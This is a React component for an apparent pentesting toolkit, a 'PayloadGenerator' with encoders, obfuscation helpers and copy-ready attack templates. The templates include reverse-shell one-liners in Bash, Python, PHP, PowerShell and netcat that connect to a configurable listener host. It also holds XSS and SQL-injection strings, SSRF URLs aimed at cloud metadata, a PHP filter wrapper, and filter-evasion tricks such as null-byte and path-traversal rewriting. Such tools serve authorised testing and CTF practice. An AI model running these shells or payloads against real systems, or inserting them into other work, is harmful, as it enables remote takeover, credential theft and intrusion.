import { useState, useEffect } from 'react';
import { Copy, Zap, Code, Shield, Globe, Hash, Terminal } from 'lucide-react';

interface PayloadGeneratorProps {
    target: string;
}

const PayloadGenerator = ({ target }: PayloadGeneratorProps) => {
    const [input, setInput] = useState('');
    const [output, setOutput] = useState('');
    const [activeSubTab, setActiveSubTab] = useState<'encoders' | 'templates' | 'obfuscation'>('encoders');

    // Listener settings
    const [lhost, setLhost] = useState('10.10.10.10');
    const [lport, setLport] = useState('4444');

    // Auto-update LHOST if target changes and looks like an IP
    useEffect(() => {
        const ipRegex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/;
        if (target && ipRegex.test(target)) {
            setLhost(target);
        }
    }, [target]);

    const encoders = [
        { name: 'Base64 Encode', fn: (s: string) => btoa(s) },
        { name: 'Base64 Decode', fn: (s: string) => { try { return atob(s); } catch (e) { return 'Invalid Base64'; } } },
        { name: 'URL Encode', fn: (s: string) => encodeURIComponent(s) },
        { name: 'URL Decode', fn: (s: string) => decodeURIComponent(s) },
        { name: 'Double URL Encode', fn: (s: string) => encodeURIComponent(encodeURIComponent(s)) },
        { name: 'Hex Encode', fn: (s: string) => s.split('').map(c => c.charCodeAt(0).toString(16)).join('') },
        { name: 'Hex Encode (\\x)', fn: (s: string) => s.split('').map(c => '\\x' + c.charCodeAt(0).toString(16)).join('') },
        {
            name: 'ROT13', fn: (s: string) => s.replace(/[a-zA-Z]/g, (c) => {
                const b = c <= 'Z' ? 90 : 122;
                const n = c.charCodeAt(0) + 13;
                return String.fromCharCode(b >= n ? n : n - 26);
            })
        },
        { name: 'HTML Entities', fn: (s: string) => s.replace(/[\u00A0-\u9999<>&]/g, (c) => '&#' + c.charCodeAt(0) + ';') },
    ];

    const templates = [
        {
            category: 'Reverse Shells',
            items: [
                { name: 'Bash -i', payload: `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1` },
                { name: 'Python3', payload: `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'` },
                { name: 'PHP', payload: `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'` },
                { name: 'PowerShell', payload: `$client = New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()` },
                { name: 'Netcat Traditional', payload: `nc -e /bin/sh ${lhost} ${lport}` },
                { name: 'Netcat OpenBSD', payload: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${lhost} ${lport} >/tmp/f` }
            ]
        },
        {
            category: 'Web Payloads',
            items: [
                { name: 'Basic XSS', payload: `<script>alert(document.cookie)</script>` },
                { name: 'Img XSS', payload: `<img src=x onerror=alert(1)>` },
                { name: 'SVG XSS', payload: `<svg onload=alert(1)>` },
                { name: 'SQLi Error-based', payload: `' OR 1=1--` },
                { name: 'SQLi Union-based', payload: `' UNION SELECT 1,2,3,database(),user()--` },
                { name: 'SSRF Localhost', payload: `http://127.0.0.1:80` },
                { name: 'SSRF AWS Metadata', payload: `http://169.254.169.254/latest/meta-data/` }
            ]
        }
    ];

    const obfuscation = [
        { name: 'Reverse String', fn: (s: string) => s.split('').reverse().join('') },
        { name: 'Random Case', fn: (s: string) => s.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('') },
        { name: 'Null Byte Injection', fn: (s: string) => s + '%00' },
        { name: 'Path Traversal (....//)', fn: (s: string) => s.replace(/\//g, '....//') },
        { name: 'Space to Comment', fn: (s: string) => s.replace(/\s/g, '/**/') },
        { name: 'MySQL Char()', fn: (s: string) => `CHAR(${s.split('').map(c => c.charCodeAt(0)).join(',')})` },
        { name: 'JavaScript fromCharCode', fn: (s: string) => `String.fromCharCode(${s.split('').map(c => c.charCodeAt(0)).join(',')})` }
    ];

    const copyToClipboard = (text: string) => {
        navigator.clipboard.writeText(text);
    };

    const handleAction = (fn: (s: string) => string) => {
        setOutput(fn(input));
    };

    return (
        <div className="space-y-6">
            {/* Listener Configuration */}
            <div className="bg-gray-800 p-6 rounded-xl border border-cyan-900/30 shadow-lg">
                <div className="flex items-center gap-3 mb-6">
                    <Terminal className="w-6 h-6 text-cyan-400" />
                    <h2 className="text-xl font-bold text-white">Listener Settings</h2>
                </div>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div className="space-y-2">
                        <label className="text-sm font-medium text-gray-400 flex items-center gap-2">
                            LHOST (Your IP)
                        </label>
                        <input
                            type="text"
                            value={lhost}
                            onChange={(e) => setLhost(e.target.value)}
                            className="w-full bg-gray-900 border border-gray-700 rounded-lg px-4 py-2.5 text-cyan-400 font-mono focus:outline-none focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500 transition-all"
                            placeholder="e.g., 10.10.14.5"
                        />
                    </div>
                    <div className="space-y-2">
                        <label className="text-sm font-medium text-gray-400 flex items-center gap-2">
                            LPORT
                        </label>
                        <input
                            type="text"
                            value={lport}
                            onChange={(e) => setLport(e.target.value)}
                            className="w-full bg-gray-900 border border-gray-700 rounded-lg px-4 py-2.5 text-cyan-400 font-mono focus:outline-none focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500 transition-all"
                            placeholder="e.g., 4444"
                        />
                    </div>
                </div>
            </div>

            <div className="bg-gray-800 rounded-xl border border-gray-700 overflow-hidden shadow-lg">
                <div className="flex border-b border-gray-700">
                    <button
                        onClick={() => setActiveSubTab('encoders')}
                        className={`flex-1 px-6 py-4 text-sm font-medium transition-colors ${activeSubTab === 'encoders' ? 'bg-gray-700 text-cyan-400 border-b-2 border-cyan-400' : 'text-gray-400 hover:text-gray-200 hover:bg-gray-750'
                            }`}
                    >
                        <div className="flex items-center justify-center gap-2">
                            <Code className="w-4 h-4" />
                            Encoders / Decoders
                        </div>
                    </button>
                    <button
                        onClick={() => setActiveSubTab('templates')}
                        className={`flex-1 px-6 py-4 text-sm font-medium transition-colors ${activeSubTab === 'templates' ? 'bg-gray-700 text-cyan-400 border-b-2 border-cyan-400' : 'text-gray-400 hover:text-gray-200 hover:bg-gray-750'
                            }`}
                    >
                        <div className="flex items-center justify-center gap-2">
                            <Zap className="w-4 h-4" />
                            Payload Templates
                        </div>
                    </button>
                    <button
                        onClick={() => setActiveSubTab('obfuscation')}
                        className={`flex-1 px-6 py-4 text-sm font-medium transition-colors ${activeSubTab === 'obfuscation' ? 'bg-gray-700 text-cyan-400 border-b-2 border-cyan-400' : 'text-gray-400 hover:text-gray-200 hover:bg-gray-750'
                            }`}
                    >
                        <div className="flex items-center justify-center gap-2">
                            <Shield className="w-4 h-4" />
                            String Hacks / Obfuscation
                        </div>
                    </button>
                </div>

                <div className="p-6">
                    {activeSubTab === 'encoders' || activeSubTab === 'obfuscation' ? (
                        <div className="space-y-6">
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                                <div className="space-y-2">
                                    <label className="text-sm font-medium text-gray-400">Input String</label>
                                    <textarea
                                        value={input}
                                        onChange={(e) => setInput(e.target.value)}
                                        className="w-full h-32 bg-gray-900 border border-gray-700 rounded-lg p-3 text-white font-mono text-sm focus:outline-none focus:border-cyan-500"
                                        placeholder="Enter text to process..."
                                    />
                                </div>
                                <div className="space-y-2">
                                    <div className="flex justify-between items-center">
                                        <label className="text-sm font-medium text-gray-400">Output</label>
                                        {output && (
                                            <button
                                                onClick={() => copyToClipboard(output)}
                                                className="text-xs text-cyan-400 hover:text-cyan-300 flex items-center gap-1"
                                            >
                                                <Copy className="w-3 h-3" />
                                                Copy
                                            </button>
                                        )}
                                    </div>
                                    <textarea
                                        value={output}
                                        readOnly
                                        className="w-full h-32 bg-gray-900 border border-gray-700 rounded-lg p-3 text-cyan-400 font-mono text-sm focus:outline-none"
                                        placeholder="Output will appear here..."
                                    />
                                </div>
                            </div>

                            <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-3">
                                {(activeSubTab === 'encoders' ? encoders : obfuscation).map((action) => (
                                    <button
                                        key={action.name}
                                        onClick={() => handleAction(action.fn)}
                                        className="px-4 py-2 bg-gray-700 border border-gray-600 rounded-lg text-xs font-medium text-gray-200 hover:bg-cyan-600 hover:border-cyan-500 transition-all text-center"
                                    >
                                        {action.name}
                                    </button>
                                ))}
                            </div>
                        </div>
                    ) : (
                        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                            <div className="md:col-span-1 space-y-4 max-h-[500px] overflow-y-auto pr-2 scrollbar-thin scrollbar-thumb-gray-700 scrollbar-track-gray-800">
                                {templates.map((cat) => (
                                    <div key={cat.category} className="space-y-2">
                                        <h3 className="text-xs font-bold text-gray-500 uppercase tracking-wider">{cat.category}</h3>
                                        <div className="flex flex-col gap-1">
                                            {cat.items.map((item) => (
                                                <button
                                                    key={item.name}
                                                    onClick={() => setOutput(item.payload)}
                                                    className="text-left px-3 py-2 rounded-lg text-sm transition-all hover:bg-gray-700 text-gray-300 hover:text-white"
                                                >
                                                    {item.name}
                                                </button>
                                            ))}
                                        </div>
                                    </div>
                                ))}
                            </div>
                            <div className="md:col-span-2 space-y-4">
                                <div className="flex justify-between items-center">
                                    <span className="text-sm font-medium text-gray-400 font-mono">Payload Preview</span>
                                    {output && (
                                        <button
                                            onClick={() => copyToClipboard(output)}
                                            className="px-3 py-1 bg-cyan-600 text-white rounded text-xs font-medium hover:bg-cyan-500 transition-all flex items-center gap-2"
                                        >
                                            <Copy className="w-3 h-3" />
                                            Copy Payload
                                        </button>
                                    )}
                                </div>
                                <div className="bg-gray-900 border border-cyan-900/50 rounded-lg p-6 min-h-[200px] relative group">
                                    <pre className="text-cyan-400 font-mono text-sm whitespace-pre-wrap break-all">
                                        {output || 'Select a template or type above...'}
                                    </pre>
                                    {output && (
                                        <div className="absolute top-2 right-2 opacity-0 group-hover:opacity-100 transition-opacity">
                                            <div className="px-2 py-1 bg-gray-800 rounded border border-gray-700 text-[10px] text-gray-400">
                                                LHOST: <span className="text-white">{lhost}</span> | LPORT: <span className="text-white">{lport}</span>
                                            </div>
                                        </div>
                                    )}
                                </div>
                                <div className="p-4 bg-gray-800/50 border border-gray-700 rounded-lg text-xs text-gray-400 flex items-start gap-3">
                                    <Shield className="w-4 h-4 text-yellow-500 flex-shrink-0 mt-0.5" />
                                    <p>
                                        Ensure your listener is running on <span className="text-white font-mono">{lhost}:{lport}</span> before executing these shells.
                                    </p>
                                </div>
                            </div>
                        </div>
                    )}
                </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div className="bg-gray-800 p-6 rounded-xl border border-gray-700 shadow-sm">
                    <div className="flex items-center gap-3 mb-4">
                        <Globe className="w-5 h-5 text-cyan-400" />
                        <h3 className="font-bold text-white">Browser Tricks</h3>
                    </div>
                    <ul className="space-y-3">
                        {[
                            { label: 'Data URI XSS', value: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' },
                            { label: 'PHP Filter Wrapper', value: 'php://filter/read=convert.base64-encode/resource=index.php' },
                            { label: 'Javascript URL', value: 'javascript:alert(1)' },
                        ].map((trick) => (
                            <li key={trick.label} className="group cursor-pointer" onClick={() => setOutput(trick.value)}>
                                <p className="text-xs text-gray-400 mb-1">{trick.label}</p>
                                <div className="bg-gray-900 p-2 rounded text-[10px] font-mono text-gray-500 group-hover:text-cyan-500 transition-colors truncate">
                                    {trick.value}
                                </div>
                            </li>
                        ))}
                    </ul>
                </div>

                <div className="bg-gray-800 p-6 rounded-xl border border-gray-700 shadow-sm">
                    <div className="flex items-center gap-3 mb-4">
                        <Hash className="w-5 h-5 text-cyan-400" />
                        <h3 className="font-bold text-white">Common Encodings Reference</h3>
                    </div>
                    <div className="grid grid-cols-2 gap-4">
                        <div>
                            <p className="text-[10px] text-gray-500 uppercase mb-2">Character</p>
                            <div className="space-y-1 font-mono text-xs text-gray-400">
                                <p>&lt; (Less Than)</p>
                                <p>&gt; (Greater Than)</p>
                                <p>&quot; (Quote)</p>
                                <p>&#39; (Apostrophe)</p>
                                <p>&amp; (Ampersand)</p>
                            </div>
                        </div>
                        <div>
                            <p className="text-[10px] text-gray-500 uppercase mb-2">URL / Hex</p>
                            <div className="space-y-1 font-mono text-xs text-cyan-500">
                                <p>%3c / 3c</p>
                                <p>%3e / 3e</p>
                                <p>%22 / 22</p>
                                <p>%27 / 27</p>
                                <p>%26 / 26</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default PayloadGenerator;
